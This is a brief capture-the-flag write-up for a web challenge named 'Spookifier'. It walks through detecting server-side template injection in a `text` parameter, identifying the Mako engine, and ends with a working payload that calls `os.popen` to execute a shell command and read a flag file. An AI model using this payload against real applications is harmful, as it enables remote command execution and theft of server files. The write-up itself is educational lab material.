# Spookifier

## Steps

1. Enter some test case via `text` parameter.
2. Notice our output displayed as the `text` parameter.
3.  Based from the ouput, it seems to be **SSTI**.
4.  I try some payloads about SSTI and see `${7*7}` active.
![](Screenshot_2023-06-22_03-55-31.png)

5. After testing and checking source, we have some useful things.
  
![Alt text](Screenshot_2023-06-22_03-37-47.png)

6. We search `Mako template injection payload` and try some payload.
7. Final payload!!!

` ${self.__init__.__globals__['util'].os.popen('cd / && cat flag.txt').read()} `

![Alt text](image.png)

